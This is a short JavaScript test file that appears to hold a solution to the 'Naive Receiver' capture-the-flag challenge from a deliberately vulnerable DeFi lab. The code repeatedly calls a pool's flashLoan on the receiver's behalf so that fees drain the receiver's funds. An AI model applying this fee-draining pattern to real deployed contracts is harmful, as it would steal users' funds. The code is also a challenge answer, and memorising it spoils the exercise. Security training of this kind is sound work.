```js
// test/naive-receiver/naive-receiver.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
               
        const ETH = await pool.ETH();
        
        for (let i = 0; i < 10; i++) 
        {    
            await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");   
        }        
    });
```
